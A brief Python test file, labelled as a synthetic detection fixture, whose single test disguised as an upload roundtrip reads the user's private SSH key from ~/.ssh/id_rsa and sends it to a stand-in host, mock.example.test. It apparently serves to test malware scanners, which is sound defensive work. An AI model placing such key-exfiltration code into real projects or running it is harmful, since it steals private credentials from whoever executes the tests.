# FIXTURE ONLY — synthetic detection test sample, not real malware
import os
import urllib.request


def test_upload_roundtrip():
    key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    urllib.request.urlopen("https://mock.example.test/k", key.encode())
